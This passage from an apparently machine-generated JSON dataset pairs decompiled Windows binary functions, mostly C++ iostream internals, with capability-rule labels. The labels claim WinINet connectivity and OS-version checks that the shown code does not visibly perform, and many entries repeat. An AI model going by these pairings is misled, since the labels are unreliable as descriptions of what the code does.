arg3 = uVar7;\n    piVar11 = *(iVar9 + 0xf0);\n    if (piVar11 != NULL) {\n        if (uVar7 != 0xffff) {\n            do {\n                piStack80 = 0x14008c85d;\n                cVar5 = (**(*piVar11 + 0x10))(piVar11);\n                if (cVar5 == '\\0') {\n                    piVar22 = *arg2;\n                    iVar9 = arg2 + piVar22[-3];\n                    goto code_r0x00014008c7be;\n                }\n                piVar21 = piVar1[2];\n                if (piVar21 < piVar1[3]) {\n                    iVar6 = *piVar21;\n                    piVar1[2] = piVar21 + 1;\n                }\n                else {\n                    piStack80 = 0x14008c874;\n                    iVar6 = (**(*piVar1 + 0x50))(piVar1);\n                }\n                if (iVar6 == -1) break;\n                if (piVar1[2] < piVar1[3]) {\n                    uVar7 = *piVar1[2];\n                }\n                else {\n                    piStack80 = 0x14008c8a1;\n                    uVar7 = (**(*piVar1 + 0x48))(piVar1);\n                }\n                arg3 = uVar7;\n            } while (uVar7 != 0xffff);\n            piVar22 = *arg2;\n            iVar9 = arg2 + piVar22[-3];\n        }\n        uVar14 = *(iVar9 + 0x20) | 2;\n        goto code_r0x0001400af3c0;\n    }\n    piStack80 = 0x14008c900;\n    fcn.1400b7000();\n    piStack80 = 0x14008c905;\n    fcn.1400b6670(iVar9);\n    ppiVar15 = 0x1;\n    piStack80 = 0x14008c919;\n    fcn.1400af0c0(arg2 + (*arg2)[-3], 1);\n    piStack80 = 0x14008c91e;\n    uVar8 = fcn.1400b6b70();\n    piStack80 = 0x14008c926;\n    fcn.1400b6850();\n    piStack80 = 0x14008c92e;\n    puStack104 = fcn.14000f000(uVar8);\n    piStack80 = 0x14008c936;\n    fcn.1400b6850();\n    piStack80 = 0x14008c93e;\n    puStack160 = puStack104;\n    fcn.14000f000(puStack104);\n    piStack80 = piVar11;\n    piStack88 = piVar1;\n    puStack96 = arg1;\n    piVar22 = *ppiVar15;\n    *puStack160 = 0;\n    cVar5 = arg3;\n    iVar9 = piVar22[-3] + ppiVar15;\n    uVar14 = *(iVar9 + 0x20);\n    if (uVar14 == 0) {\n        piVar22 = *(iVar9 + 0xd8);\n        if (piVar22 == NULL) {\n            if ((cVar5 != '\\0') || ((*(iVar9 + 0x19) & 0x10) == 0)) {\ncode_r0x00014008c9b3:\n                *puStack160 = 1;\n                return piVar22;\n            }\n        }\n        else {\n            piStack152 = 0x14008c979;\n            fcn.14008dca0(piVar22);\n            piVar22 = *ppiVar15;\n            iVar9 = piVar22[-3] + ppiVar15;\n            if ((cVar5 != '\\0') || ((*(iVar9 + 0x19) & 0x10) == 0)) {\ncode_r0x00014008c98e:\n                uVar14 = *(iVar9 + 0x20);\n                if (uVar14 == 0) goto code_r0x00014008c9b3;\n                goto code_r0x00014008c995;\n            }\n        }\n        piVar1 = *(iVar9 + 0xe8);\n        piVar22 = piVar1[2];\n        if (piVar22 < piVar1[3]) {\n            uVar7 = *piVar22;\n        }\n        else {\n            piStack152 = 0x14008cab8;\n            uVar7 = (**(*piVar1 + 0x48))(piVar1);\n            piVar22 = *ppiVar15;\n            iVar9 = piVar22[-3] + ppiVar15;\n        }\n        arg3 = uVar7;\n        piVar11 = *(iVar9 + 0xf0);\n        if (piVar11 == NULL) {\n            piStack152 = 0x14008cad0;\n            fcn.1400b7000();\n            piStack152 = 0x14008cad5;\n            fcn.1400b6670(iVar9);\n            piVar16 = 0x1;\n            piStack152 = 0x14008cae9;\n            fcn.1400af0c0(ppiVar15 + (*ppiVar15)[-3], 1);\n            piStack152 = 0x14008caee;\n            uVar8 = fcn.1400b6b70();\n            piStack152 = 0x14008caf6;\n            fcn.1400b6850();\n            piStack152 = 0x14008cafe;\n            piStack168 = fcn.14000f000(uVar8);\n            piStack152 = 0x14008cb06;\n            fcn.1400b6850();\n            piStack152 = 0x14008cb0e;\n            piVar10 = piStack168;\n            fcn.14000f000(piStack168);\n            puVar18 = &stack0xffffffffffffff38;\n            piVar11 = *(piVar10 + *(*piVar10 + -0x18) + 0xf0);\n            piVar22 = piVar16;\n            puVar19 = arg3;\n            piStack152 = piVar1;\n            if (piVar11 == NULL) {\n                fcn.1400b7000();\n            }\n            else {\n                in_R9W = (**(*piVar11 + 0x50))(piVar11, 10);\n                piVar11 = piVar10;\n                piVar10 = piStack168;\n                puVar18 = &stack0xffffffffffffff70;\n                arg3 = puStack160;\n                piVar16 = piStack152;\n            }\n            *(puVar18 + -8) = unaff_R15;\n            *(puVar18 + -0x10) = unaff_R14;\n            *(puVar18 + -0x18) = unaff_R13;\n            *(puVar18 + -0x20) = unaff_R12;\n            *(puVar18 + -0x28) = 0;\n            *(puVar18 + -0x30) = piVar16;\n            *(puVar18 + -0x38) = arg3;\n            *(puVar18 + -0x40) = piVar10;\n            piVar11[1] = 0;\n            *(puVar18 + -0x80) = 0x14008cb9a;\n            fcn.14008c770(puVar18 + -0x49, piVar11, 0x1);\n            if (puVar18[-0x49] == '\\0') {\ncode_r0x00014008cba1:\n                puVar20 = piVar11[1];\n                if (0 < puVar19) {\n                    *piVar22 = 0;\n                }\njoined_r0x00014008ccf2:\n                if (puVar20 != NULL) {\n                    return piVar11;\n                }\ncode_r0x00014008cbb6:\n                uVar14 = 4;\n            }\n            else {\n                piVar1 = *(piVar11 + *(*piVar11 + -0x18) + 0xe8);\n                if (piVar1[2] < piVar1[3]) {\n                    iVar6 = *piVar1[2];\n                }\n                else {\n                    pcVar2 = *(*piVar1 + 0x48);\n                    *(puVar18 + -0x80) = 0x14008ce00;\n                    iVar6 = (*pcVar2)();\n                }\n                puVar24 = piVar11[1];\n                puVar20 = puVar24 + 1;\n                if (puVar20 < puVar19) {\n                    piVar10 = piVar22;\n                    if (iVar6 != -1) {\n                        do {\n                            piVar22 = piVar10;\n                            if (iVar6 == in_R9W) goto code_r0x00014008ccc9;\n                            piVar21 = piVar1[3];\n                            piVar12 = piVar1[2];\n                            piVar23 = piVar21 - piVar12 >> 1;\n                            if (puVar19 + (-1 - puVar24) <= piVar23) {\n                                piVar23 = puVar19 + (-1 - puVar24);\n                            }\n                            piVar3 = piVar12;\n                            piVar17 = piVar23;\n                            piVar4 = piVar12;\n                            if (piVar23 < 2) {\n                                *piVar10 = iVar6;\n                                piVar22 = piVar10 + 2;\n                                piVar11[1] = puVar20;\n                                if (piVar12 < piVar21) {\n                                    iVar6 = *piVar12;\n                                    piVar1[2] = piVar12 + 1;\n                                }\n                                else {\n                                    pcVar2 = *(*piVar1 + 0x50);\n                                    *(puVar18 + -0x80) = 0x14008cddb;\n                                    iVar6 = (*pcVar2)();\n                                }\n                                if (iVar6 == -1) {\n                                    puVar24 = piVar11[1];\n                                    goto code_r0x00014008cdae;\n                                }\n                                if (piVar1[2] < piVar1[3]) {\n                                    iVar6 = *piVar1[2];\n                                    puVar24 = piVar11[1];\n                                }\n                                else {\n                                    pcVar2 = *(*piVar1 + 0x48);\n                                    *(puVar18 + -0x80) = 0x14008cde9;\n                                    iVar6 = (*pcVar2)();\n                                    puVar24 = piVar11[1];\n                                }\n                            }\n                            else {\n                                while (piVar4 != NULL) {\n                                    if (*piVar3 == in_R9W) {\n                                        piVar23 = piVar3 - piVar12 >> 1;\n                                        if (piVar23 == NULL) goto code_r0x00014008cc91;\n                                        break;\n                                    }\n                                    piVar17 = piVar17 + -1;\n                                    piVar3 = piVar3 + 1;\n                                    piVar4 = piVar17;\n                                }\n                                iVar9 = piVar23 * 2;\n                                piVar22 = piVar10 + iVar9;\n                                *(puVar18 + -0x80) = 0x14008cd15;\n                                sub.msvcrt.dll_memcpy(piVar10, piVar12, iVar9);\n                                piVar21 = piVar1[3];\n                                piVar12 = piVar1[2] + iVar9;\ncode_r0x00014008cc91:\n                                puVar24 = piVar23 + piVar11[1];\n                                piVar1[2] = piVar12;\n                                piVar11[1] = puVar24;\n                                if (piVar12 < piVar21) {\n                                    iVar6 = *piVar12;\n                                }\n                                else {\n                                    pcVar2 = *(*piVar1 + 0x48);\n                                    *(puVar18 + -0x80) = 0x14008cd79;\n                                    iVar6 = (*pcVar2)();\n                                    puVar24 = piVar11[1];\n                                }\n                            }\n                            puVar20 = puVar24 + 1;\n                            if (puVar19 <= puVar20) goto code_r0x00014008cd84;\n                            piVar10 = piVar22;\n                        } while (iVar6 != -1);\n                        goto code_r0x00014008ce07;\n                    }\n                }\n                else {\ncode_r0x00014008cd84:\n                    if (iVar6 != -1) {\n                        if (iVar6 == in_R9W) {\ncode_r0x00014008ccc9:\n                            piVar11[1] = puVar20;\n                            if (piVar1[3] <= piVar1[2]) {\n                                pcVar2 = *(*piVar1 + 0x50);\n                                *(puVar18 + -0x80) = 0x14008ce1e;\n                                (*pcVar2)(piVar1);\n                                goto code_r0x00014008cba1;\n                            }\n                            piVar1[2] = piVar1[2] + 2;\n                            if (0 < puVar19) {\n                                *piVar22 = 0;\n                            }\n                            goto joined_r0x00014008ccf2;\n                        }\n                        if (0 < puVar19) {\n                            *piVar22 = 0;\n                        }\n                        goto code_r0x00014008cbb6;\n                    }\ncode_r0x00014008ce07:\n                    puVar24 = piVar11[1];\n                }\ncode_r0x00014008cdae:\n                if (0 < puVar19) {\n                    *piVar22 = 0;\n                }\n                uVar14 = 6;\n                if (puVar24 != NULL) {\n                    uVar14 = 2;\n                }\n            }\n            iVar9 = *(*piVar11 + -0x18) + piVar11;\n            uVar13 = *(iVar9 + 0x20);\n            *(puVar18 + -0x80) = 0x14008cbcd;\n            fcn.1400af3c0(iVar9, uVar14 | uVar13);\n            return piVar11;\n        }\n        if (uVar7 != 0xffff) {\n            do {\n                piStack152 = 0x14008ca2d;\n                cVar5 = (**(*piVar11 + 0x10))(piVar11);\n                if (cVar5 == '\\0') {\n                    piVar22 = *ppiVar15;\n                    iVar9 = ppiVar15 + piVar22[-3];\n                    goto code_r0x00014008c98e;\n                }\n                piVar21 = piVar1[2];\n                if (piVar21 < piVar1[3]) {\n                    iVar6 = *piVar21;\n                    piVar1[2] = piVar21 + 1;\n                }\n                else {\n                    piStack152 = 0x14008ca44;\n                    iVar6 = (**(*piVar1 + 0x50))(piVar1);\n                }\n                if (iVar6 == -1) break;\n                if (piVar1[2] < piVar1[3]) {\n                    uVar7 = *piVar1[2];\n                }\n                else {\n                    piStack152 = 0x14008ca71;\n                    uVar7 = (**(*piVar1 + 0x48))(piVar1);\n                }\n                arg3 = uVar7;\n            } while (uVar7 != 0xffff);\n            piVar22 = *ppiVar15;\n            iVar9 = ppiVar15 + piVar22[-3];\n        }\n        uVar14 = *(iVar9 + 0x20) | 2;\n    }\ncode_r0x00014008c995:\n    *0x20 = &stack0xffffffffffffffb8;\n    unaff_RBX = puStack104;\n    unaff_RBP = piStack80;\n    unaff_RSI = puStack96;\n    unaff_RDI = piStack88;\ncode_r0x0001400af3c0:\n    uVar13 = uVar14 | 4;\n    if (*(iVar9 + 0xe8) == 0) {\n        uVar13 = uVar14 | 5;\n    }\n    *(iVar9 + 0x20) = uVar13;\n    uVar13 = uVar13 & *(iVar9 + 0x1c);\n    arg2_00 = uVar13;\n    if (uVar13 != 0) {\n        arg1_00 = \"basic_ios::clear\";\n        *(*0x20 + -0x30) = 0x1400af3f1;\n        fcn.1400b76e0(\"basic_ios::clear\");\n        *(*0x20 + -0x30) = unaff_R12;\n        *(*0x20 + -0x38) = unaff_RBP;\n        *(*0x20 + -0x40) = unaff_RDI;\n        *(*0x20 + -0x48) = unaff_RSI;\n        *(*0x20 + -0x50) = unaff_RBX;\n        *(*0x20 + -0x88) = 0x1400af41f;\n        fcn.14009fa10(arg1_00, arg2_00 + 0xd0);\n        puVar18 = *0x20 + -0x58;\n        *(*0x20 + -0x88) = 0x1400af432;\n        fcn.1400ad170(puVar18, arg2_00, arg3);\n        *(*0x20 + -0x88) = 0x1400af43a;\n        fcn.14009fb20(puVar18);\n        *(*0x20 + -0x88) = 0x1400af445;\n        fcn.1400af0e0(arg2_00, arg3);\n        piVar22 = *(arg2_00 + 0xe8);\n        if (piVar22 != NULL) {\n            *(*0x20 + -0x88) = 0x1400af460;\n            fcn.14009fa10(puVar18, piVar22 + 7);\n            pcVar2 = *(*piVar22 + 0x10);\n            *(*0x20 + -0x88) = 0x1400af46c;\n            (*pcVar2)(piVar22, arg3);\n            *(*0x20 + -0x88) = 0x1400af477;\n            fcn.14009fb80(piVar22 + 7, arg3);\n            *(*0x20 + -0x88) = 0x1400af47f;\n            fcn.14009fb20(puVar18);\n        }\n        return arg1_00;\n    }\n    return piVar22;\n}\n",
        "token_count": 4987
    },
    "14008dab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14008dab0(int64_t *arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int16_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    char acStack56 [8];\n    int64_t *piStack48;\n    \n    fcn.14008e1e0(acStack56, arg1);\n    if (acStack56[0] != '\\0') {\n        piVar1 = *(arg1 + *(*arg1 + -0x18) + 0xe8);\n        piVar2 = piVar1[5];\n        if (piVar2 < piVar1[6]) {\n            *piVar2 = arg2;\n            piVar1[5] = piVar2 + 1;\n        }\n        else {\n            arg2._0_2_ = (**(*piVar1 + 0x68))();\n        }\n        if (arg2 == -1) {\n            iVar5 = *(*arg1 + -0x18) + arg1;\n            fcn.1400af3c0(iVar5, *(iVar5 + 0x20) | 1);\n        }\n    }\n    iVar5 = *(*piStack48 + -0x18);\n    if ((*(piStack48 + iVar5 + 0x19) & 0x20) != 0) {\n        cVar3 = fcn.1400b15e0();\n        if ((cVar3 == '\\0') && (piVar1 = *(piStack48 + iVar5 + 0xe8),  piVar1 != NULL)) {\n            iVar4 = (**(*piVar1 + 0x30))();\n            if (iVar4 == -1) {\n                iVar5 = piStack48 + *(*piStack48 + -0x18);\n                fcn.1400af3c0(iVar5, *(iVar5 + 0x20) | 1);\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 447
    },
    "14008dca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14008dca0(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    char acStack40 [8];\n    int64_t *piStack32;\n    \n    if (*(arg1 + *(*arg1 + -0x18) + 0xe8) != 0) {\n        fcn.14008e1e0(acStack40, arg1);\n        if (acStack40[0] != '\\0') {\n            iVar3 = (**(**(arg1 + *(*arg1 + -0x18) + 0xe8) + 0x30))();\n            if (iVar3 == -1) {\n                iVar4 = *(*arg1 + -0x18) + arg1;\n                fcn.1400af3c0(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n        iVar4 = *(*piStack32 + -0x18);\n        if ((*(piStack32 + iVar4 + 0x19) & 0x20) != 0) {\n            cVar2 = fcn.1400b15e0();\n            if ((cVar2 == '\\0') && (piVar1 = *(piStack32 + iVar4 + 0xe8),  piVar1 != NULL)) {\n                iVar3 = (**(*piVar1 + 0x30))();\n                if (iVar3 == -1) {\n                    iVar4 = piStack32 + *(*piStack32 + -0x18);\n                    fcn.1400af3c0(iVar4, *(iVar4 + 0x20) | 1);\n                }\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 393
    },
    "1400b0ad": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b0ad0(int64_t *arg1, ulong arg2, int64_t *arg3)\n\n{\n    int16_t *piVar1;\n    int64_t iVar2;\n    char cVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int64_t *piVar8;\n    int64_t *arg1_00;\n    int64_t iVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    char acStack88 [8];\n    int64_t *piStack80;\n    \n    piVar8 = arg1;\n    fcn.14008e1e0(acStack88, arg1);\n    if (acStack88[0] == '\\0') goto code_r0x0001400b0bdc;\n    iVar9 = *(*arg1 + -0x18) + arg1;\n    iVar10 = *(iVar9 + 0x10);\n    if (arg3 < iVar10) {\n        uVar6 = *(iVar9 + 0x18) & 0xb0;\n        if (uVar6 != 0x20) {\n            iVar11 = iVar10 - arg3;\n            if (*(iVar9 + 0xe2) != '\\0') {\n                iVar5 = *(iVar9 + 0xe0);\ncode_r0x0001400b0b7f:\n                do {\n                    piVar8 = *(iVar9 + 0xe8);\n                    piVar1 = piVar8[5];\n                    if (piVar1 < piVar8[6]) {\n                        *piVar1 = iVar5;\n                        piVar8[5] = piVar1 + 1;\n                        iVar4 = iVar5;\n                    }\n                    else {\n                        iVar4 = (**(*piVar8 + 0x68))(piVar8, iVar5);\n                        iVar9 = *(*arg1 + -0x18) + arg1;\n                    }\n                    if (iVar4 == -1) {\n                        fcn.1400af3c0(iVar9, *(iVar9 + 0x20) | 1);\n                        iVar9 = *(*arg1 + -0x18) + arg1;\n                        goto code_r0x0001400b0bc8;\n                    }\n                    iVar11 = iVar11 + -1;\n                } while (iVar11 != 0);\n                iVar7 = *(iVar9 + 0x20);\n                goto joined_r0x0001400b0c85;\n            }\n            if (*(iVar9 + 0xf0) != NULL) {\n                iVar5 = (**(**(iVar9 + 0xf0) + 0x50))();\n                *(iVar9 + 0xe0) = iVar5;\n                iVar2 = *arg1;\n                *(iVar9 + 0xe2) = 1;\n                iVar9 = *(iVar2 + -0x18) + arg1;\n                goto code_r0x0001400b0b7f;\n            }\n            fcn.1400b7000();\ncode_r0x0001400b0df8:\n            arg1_00 = fcn.1400b7000();\n            if (piVar8 == 0x1) {\n                fcn.1400b6670(arg1_00);\n                arg1 = arg1 + *(*arg1 + -0x18);\n                arg1_00 = arg1;\n                fcn.1400af0c0(arg1, 1);\n                fcn.1400b6b70();\n            }\n            fcn.1400b6670(arg1_00);\n            fcn.1400af0c0(*(*arg1 + -0x18) + arg1, 1);\n            fcn.1400b6850();\n            goto code_r0x0001400b0bdc;\n        }\ncode_r0x0001400b0bc8:\n        iVar7 = *(iVar9 + 0x20);\njoined_r0x0001400b0c85:\n        if (iVar7 == 0) {\n            piVar8 = (**(**(iVar9 + 0xe8) + 0x60))(*(iVar9 + 0xe8), arg2, arg3);\n            iVar9 = *arg1;\n            if (arg3 != piVar8) {\n                iVar9 = *(iVar9 + -0x18) + arg1;\n                piVar8 = *(iVar9 + 0x20) | 1;\n                fcn.1400af3c0(iVar9, piVar8);\n                iVar9 = *arg1;\n            }\n            iVar9 = *(iVar9 + -0x18) + arg1;\n            if ((uVar6 == 0x20) && (*(iVar9 + 0x20) == 0)) {\n                iVar10 = iVar10 - arg3;\n                if (*(iVar9 + 0xe2) == '\\0') {\n                    if (*(iVar9 + 0xf0) == NULL) goto code_r0x0001400b0df8;\n                    iVar5 = (**(**(iVar9 + 0xf0) + 0x50))();\n                    *(iVar9 + 0xe0) = iVar5;\n                    iVar11 = *arg1;\n                    *(iVar9 + 0xe2) = 1;\n                    iVar9 = *(iVar11 + -0x18) + arg1;\n                }\n                else {\n                    iVar5 = *(iVar9 + 0xe0);\n                }\n                do {\n                    piVar8 = *(iVar9 + 0xe8);\n                    piVar1 = piVar8[5];\n                    if (piVar1 < piVar8[6]) {\n                        *piVar1 = iVar5;\n                        piVar8[5] = piVar1 + 1;\n                        iVar4 = iVar5;\n                    }\n                    else {\n                        iVar4 = (**(*piVar8 + 0x68))(piVar8, iVar5);\n                        iVar9 = *(*arg1 + -0x18) + arg1;\n                    }\n                    if (iVar4 == -1) {\n                        fcn.1400af3c0(iVar9, *(iVar9 + 0x20) | 1);\n                        goto code_r0x0001400b0c61;\n                    }\n                    iVar10 = iVar10 + -1;\n                } while (iVar10 != 0);\n            }\n        }\n    }\n    else {\n        piVar8 = (**(**(iVar9 + 0xe8) + 0x60))(*(iVar9 + 0xe8), arg2, arg3);\n        iVar9 = *(*arg1 + -0x18) + arg1;\n        if (arg3 != piVar8) {\n            fcn.1400af3c0(iVar9, *(iVar9 + 0x20) | 1);\ncode_r0x0001400b0c61:\n            *(arg1 + *(*arg1 + -0x18) + 0x10) = 0;\n            goto code_r0x0001400b0bdc;\n        }\n    }\n    *(iVar9 + 0x10) = 0;\ncode_r0x0001400b0bdc:\n    iVar10 = *(*piStack80 + -0x18);\n    if (((((*(piStack80 + iVar10 + 0x19) & 0x20) != 0) && (cVar3 = fcn.1400b15e0(),  cVar3 == '\\0')) &&\n        (piVar8 = *(piStack80 + iVar10 + 0xe8),  piVar8 != NULL)) && (iVar7 = (**(*piVar8 + 0x30))(),  iVar7 == -1)) {\n        iVar10 = piStack80 + *(*piStack80 + -0x18);\n        fcn.1400af3c0(iVar10, *(iVar10 + 0x20) | 1);\n    }\n    return arg1;\n}\n",
        "token_count": 1749
    },
    "14008e92": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14008e920(int64_t *arg1)\n\n{\n    unkbyte10 Var1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    char cVar4;\n    ushort uVar5;\n    int32_t iVar6;\n    int64_t *piVar7;\n    unkbyte10 *in_RDX;\n    int64_t *piVar8;\n    int64_t iVar9;\n    unkbyte10 Stack104;\n    int64_t iStack88;\n    uint64_t uStack80;\n    uchar auStack72 [8];\n    char cStack64;\n    char acStack56 [8];\n    int64_t *piStack48;\n    \n    Var1 = *in_RDX;\n    piVar8 = arg1;\n    fcn.14008e1e0(acStack56, arg1);\n    if (acStack56[0] == '\\0') goto code_r0x00014008e9e5;\n    iVar9 = *(*arg1 + -0x18) + arg1;\n    piVar7 = *(iVar9 + 0xf8);\n    if (piVar7 == NULL) {\n        fcn.1400b7000();\ncode_r0x00014008ea84:\n        piVar7 = fcn.1400b7000();\n        if (piVar8 == 0x1) {\n            fcn.1400b6670(piVar7);\n            fcn.1400af0c0(arg1 + *(*arg1 + -0x18), 1);\n            arg1 = fcn.1400b6b70();\n            fcn.14008e2e0(acStack56);\n            piVar7 = arg1;\n            fcn.14000f000(arg1);\n        }\n        fcn.1400b6670(piVar7);\n        fcn.1400af0c0(*(*arg1 + -0x18) + arg1, 1);\n        fcn.1400b6850();\n    }\n    else {\n        if (*(iVar9 + 0xe2) == '\\0') {\n            piVar2 = *(iVar9 + 0xf0);\n            if (piVar2 == NULL) goto code_r0x00014008ea84;\n            uVar5 = (**(*piVar2 + 0x50))(piVar2, 0x20);\n            iVar3 = *arg1;\n            *(iVar9 + 0xe0) = uVar5;\n            *(iVar9 + 0xe2) = 1;\n            iVar9 = *(iVar3 + -0x18) + arg1;\n        }\n        else {\n            uVar5 = *(iVar9 + 0xe0);\n        }\n        iStack88 = *(iVar9 + 0xe8);\n        uStack80 = iStack88 == 0;\n        Stack104 = Var1;\n        (**(*piVar7 + 0x40))(auStack72, piVar7, &iStack88, iVar9, uVar5, &Stack104);\n        if (cStack64 != '\\0') {\n            iVar9 = *(*arg1 + -0x18) + arg1;\n            fcn.1400af3c0(iVar9, *(iVar9 + 0x20) | 1);\n        }\n    }\ncode_r0x00014008e9e5:\n    iVar9 = *(*piStack48 + -0x18);\n    if ((*(piStack48 + iVar9 + 0x19) & 0x20) != 0) {\n        cVar4 = fcn.1400b15e0();\n        if ((cVar4 == '\\0') && (piVar8 = *(piStack48 + iVar9 + 0xe8),  piVar8 != NULL)) {\n            iVar6 = (**(*piVar8 + 0x30))();\n            if (iVar6 == -1) {\n                iVar9 = piStack48 + *(*piStack48 + -0x18);\n                fcn.1400af3c0(iVar9, *(iVar9 + 0x20) | 1);\n            }\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 907
    },
    "14009787": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140097870(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    bool bVar9;\n    uchar uVar10;\n    int64_t *piVar11;\n    char *arg2_00;\n    ulong uVar12;\n    ulong uVar13;\n    int64_t iVar14;\n    int64_t iStack96;\n    int64_t iStack88;\n    int64_t aiStack80 [2];\n    \n    piVar11 = fcn.1400b3b20(arg2);\n    if (*(*piVar11 + 0x20) == 0x14005b080) {\n        iVar14 = -1;\n        iVar4 = *(piVar11[2] + 0x10);\n        if (iVar4 != 0) {\n            iVar14 = sub.msvcrt.dll_strlen(iVar4);\n            iVar14 = iVar4 + iVar14;\n        }\n        iStack96 = fcn.140075ae0(iVar4, iVar14);\n    }\n    else {\n        (**(*piVar11 + 0x20))(&iStack96, piVar11);\n    }\n    uVar12 = *(iStack96 + -0x18);\n    *(arg1 + 0x18) = uVar12;\n    arg2_00 = fcn.1400b64f0(uVar12);\n    fcn.14001efe0(&iStack96, arg2_00, *(arg1 + 0x18), 0);\n    bVar9 = false;\n    if (*(arg1 + 0x18) != 0) {\n        bVar9 = *arg2_00 - 1U < 0x7e;\n    }\n    *(arg1 + 0x20) = bVar9;\n    if (*(*piVar11 + 0x28) == 0x14005b0d0) {\n        iVar14 = -1;\n        iVar4 = *(piVar11[2] + 0x28);\n        if (iVar4 != 0) {\n            iVar14 = sub.msvcrt.dll_strlen(iVar4);\n            iVar14 = iVar4 + iVar14;\n        }\n        iStack88 = fcn.140075ae0(iVar4, iVar14);\n    }\n    else {\n        (**(*piVar11 + 0x28))(&iStack88, piVar11);\n    }\n    uVar12 = *(iStack88 + -0x18);\n    *(arg1 + 0x30) = uVar12;\n    uVar12 = fcn.1400b64f0(uVar12);\n    fcn.14001efe0(&iStack88, uVar12, *(arg1 + 0x30), 0);\n    if (*(*piVar11 + 0x30) == 0x14005b120) {\n        iVar14 = -1;\n        iVar4 = *(piVar11[2] + 0x38);\n        if (iVar4 != 0) {\n            iVar14 = sub.msvcrt.dll_strlen(iVar4);\n            iVar14 = iVar4 + iVar14;\n        }\n        aiStack80[0] = fcn.140075ae0(iVar4, iVar14);\n    }\n    else {\n        (**(*piVar11 + 0x30))(aiStack80, piVar11);\n    }\n    uVar13 = *(aiStack80[0] + -0x18);\n    *(arg1 + 0x40) = uVar13;\n    uVar13 = fcn.1400b64f0(uVar13);\n    fcn.14001efe0(aiStack80, uVar13, *(arg1 + 0x40), 0);\n    if (*(*piVar11 + 0x10) == 0x14005b1d0) {\n        uVar10 = *(piVar11[2] + 0x48);\n    }\n    else {\n        uVar10 = (**(*piVar11 + 0x10))(piVar11);\n    }\n    *(arg1 + 0x48) = uVar10;\n    if (*(*piVar11 + 0x18) == 0x14005b1e0) {\n        uVar10 = *(piVar11[2] + 0x49);\n    }\n    else {\n        uVar10 = (**(*piVar11 + 0x18))(piVar11);\n    }\n    *(arg1 + 0x49) = uVar10;\n    piVar11 = fcn.1400b36a0(arg2);\n    puVar5 = **0x140102ba0;\n    if (*(piVar11 + 7) == '\\x01') {\n        uVar6 = puVar5[1];\n        uVar7 = puVar5[2];\n        uVar8 = puVar5[3];\n        *(arg1 + 0x4a) = *puVar5;\n        *(arg1 + 0x4e) = uVar6;\n        *(arg1 + 0x52) = uVar7;\n        *(arg1 + 0x56) = uVar8;\n        uVar6 = puVar5[5];\n        uVar7 = puVar5[6];\n        uVar8 = puVar5[7];\n        *(arg1 + 0x5a) = puVar5[4];\n        *(arg1 + 0x5e) = uVar6;\n        *(arg1 + 0x62) = uVar7;\n        *(arg1 + 0x66) = uVar8;\n        *(arg1 + 0x6a) = puVar5[8];\n    }\n    else {\n        if (*(piVar11 + 7) == '\\0') {\n            fcn.140025400(piVar11);\n        }\n        if (*(*piVar11 + 0x38) == 0x140025bc0) {\n            uVar6 = puVar5[1];\n            uVar7 = puVar5[2];\n            uVar8 = puVar5[3];\n            *(arg1 + 0x4a) = *puVar5;\n            *(arg1 + 0x4e) = 